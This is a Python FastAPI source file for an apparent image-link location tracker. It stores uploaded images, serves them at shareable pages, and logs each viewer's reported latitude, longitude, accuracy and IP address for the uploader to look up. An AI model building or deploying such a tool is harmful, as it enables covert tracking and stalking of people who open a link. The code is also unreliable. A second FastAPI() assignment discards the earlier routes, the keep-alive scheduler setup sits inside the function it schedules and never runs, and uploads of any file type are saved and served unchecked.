from fastapi import FastAPI, Request, HTTPException, File, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse,FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from apscheduler.schedulers.background import BackgroundScheduler 
from apscheduler.triggers.interval import IntervalTrigger
import logging
import requests
from pathlib import Path
from datetime import datetime
import sqlite3
import time
import shutil
import uuid
import os
BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "locations.db"
IMAGE_FOLDER = Path("static/images")

app = FastAPI(
    title="Image Location Tracker API",
    docs_url=None,  # disables Swagger UI (/docs)
    redoc_url=None,  # disables ReDoc UI (/redoc)
    openapi_url=None,  # disables OpenAPI JSON (/openapi.json)
)
# Mount static folder for images/css/js
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="static")
PING_INTERVAL_MINUTES = 9
RENDER_HOSTNAME = "location-tracker-lbg5.onrender.com"
PING_URL = f"https://{RENDER_HOSTNAME}/keep-alive" if RENDER_HOSTNAME else None
scheduler = BackgroundScheduler()
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


# -------------------- DB INIT --------------------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            image_id TEXT NOT NULL,
            lat REAL,
            lon REAL,
            accuracy REAL,
            received_at TEXT,
            remote_addr TEXT
        )
    """)
    conn.commit()
    conn.close()


@app.on_event("startup")
def on_startup():
    IMAGE_FOLDER.mkdir(parents=True, exist_ok=True)
    init_db()


def ping_self():
    """
    Function executed by the scheduler to send a request to the
    '/keep-alive' endpoint, resetting the idle timer on the hosting service.
    """
    if PING_URL:
        try:
            # We use a short timeout since this is an internal check
            # Use verify=False if facing SSL/self-signed certificate issues, though
            # Render generally handles SSL cleanly and this should be fine.
            response = requests.get(PING_URL, timeout=5)
            if response.status_code == 200:
                logging.info(f"Self-ping successful. Status: {response.status_code}")
            else:
                logging.warning(
                    f"Self-ping returned non-200 status: {response.status_code}"
                )
        except requests.exceptions.RequestException as e:
            logging.error(f"Self-ping failed: {e}")
    else:
        logging.warning(
            "RENDER_EXTERNAL_HOSTNAME not found. Self-ping is disabled for local running."
        )

    # -------------------- Event Handlers (Startup/Shutdown) --------------------

    # STARTUP: Configure and start the keep-alive scheduler (NEW)
    if PING_URL:
        scheduler.add_job(
            ping_self,
            IntervalTrigger(minutes=PING_INTERVAL_MINUTES),
            id="keep_alive_job",
            name="Keep Alive Pinger",
            replace_existing=True,
        )
        scheduler.start()
        logging.info(
            f"Keep-Alive Scheduler started. Pinging {PING_URL} every {PING_INTERVAL_MINUTES} minutes."
        )
    else:
        # This will be normal when running locally
        logging.warning(
            "Keep-Alive Scheduler not started: RENDER_EXTERNAL_HOSTNAME is not set."
        )


@app.on_event("shutdown")
def shutdown_event():
    """
    Shuts down the scheduler cleanly when the app stops.
    """
    # SHUTDOWN: Stop the keep-alive scheduler (NEW)
    if scheduler.running:
        scheduler.shutdown()
        logging.info("Keep-Alive Scheduler shut down.")


# -------------------- API Endpoints --------------------


# NEW: Endpoint for the scheduler to ping
@app.get("/keep-alive", tags=["Maintenance"])
async def keep_alive_check():
    """
    A simple endpoint to confirm the server is running.
    This is the target for the internal self-ping.
    """
    return {"status": "ok", "time": datetime.now().isoformat()}


# -------------------- UPLOAD IMAGE --------------------
@app.post("/upload")
async def upload_image(file: UploadFile = File(...)):
    file_ext = Path(file.filename).suffix
    unique_name = f"{uuid.uuid4().hex}{file_ext}"
    save_path = IMAGE_FOLDER / unique_name

    with open(save_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {"ok": True, "image_id": unique_name}


# -------------------- REPORT LOCATION --------------------
@app.post("/report")
async def report_location(request: Request):
    try:
        payload = await request.json()
    except:
        payload = {}

    image_id = payload.get("image")
    lat = payload.get("lat")
    lon = payload.get("lon")
    if image_id and "." in image_id:
        image_id = image_id.split(".")[0]
    accuracy = payload.get("accuracy")
    received_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    remote_addr = request.client.host if request.client else "unknown"

    if not image_id:
        return JSONResponse(content={"error": "Missing image id"}, status_code=400)

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        """
        INSERT INTO locations (image_id, lat, lon, accuracy, received_at, remote_addr)
        VALUES (?, ?, ?, ?, ?, ?)
    """,
        (image_id, lat, lon, accuracy, received_at, remote_addr),
    )
    conn.commit()
    conn.close()

    return {"ok": True}


# -------------------- GET LAST LOCATION FOR IMAGE --------------------
@app.get("/logs/last/{image_id}")
async def get_last_location(image_id: str):
    image_id = image_id.split(".")[0]
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute(
        """
        SELECT * FROM locations
        WHERE image_id = ?
        ORDER BY id DESC
        LIMIT 1
    """,
        (image_id,),
    )
    row = c.fetchone()
    conn.close()

    if not row:
        return JSONResponse(
            content={"error": "No location found for this image"}, status_code=404
        )

    return {
        "id": row["id"],
        "image_id": row["image_id"],
        "lat": row["lat"],
        "lon": row["lon"],
        "accuracy": row["accuracy"],
        "received_at": row["received_at"],
        "remote_addr": row["remote_addr"],
    }


# -------------------- FRONTEND --------------------
@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})



app = FastAPI()

@app.get("/ads.txt")
async def serve_ads():
    file_path = os.path.join(os.path.dirname(__file__), "ads.txt")
    return FileResponse(file_path, media_type="text/plain")

@app.get("/i/{image_id}", response_class=HTMLResponse)
async def image_tracker(request: Request, image_id: str):
    image_path = IMAGE_FOLDER / image_id
    if not image_path.is_file():
        raise HTTPException(status_code=404, detail="Image not found")
    return templates.TemplateResponse(
        "view.html",
        {
            "request": request,
            "img_url": f"/static/images/{image_id}",
            "image_id": image_id,
        },
    )
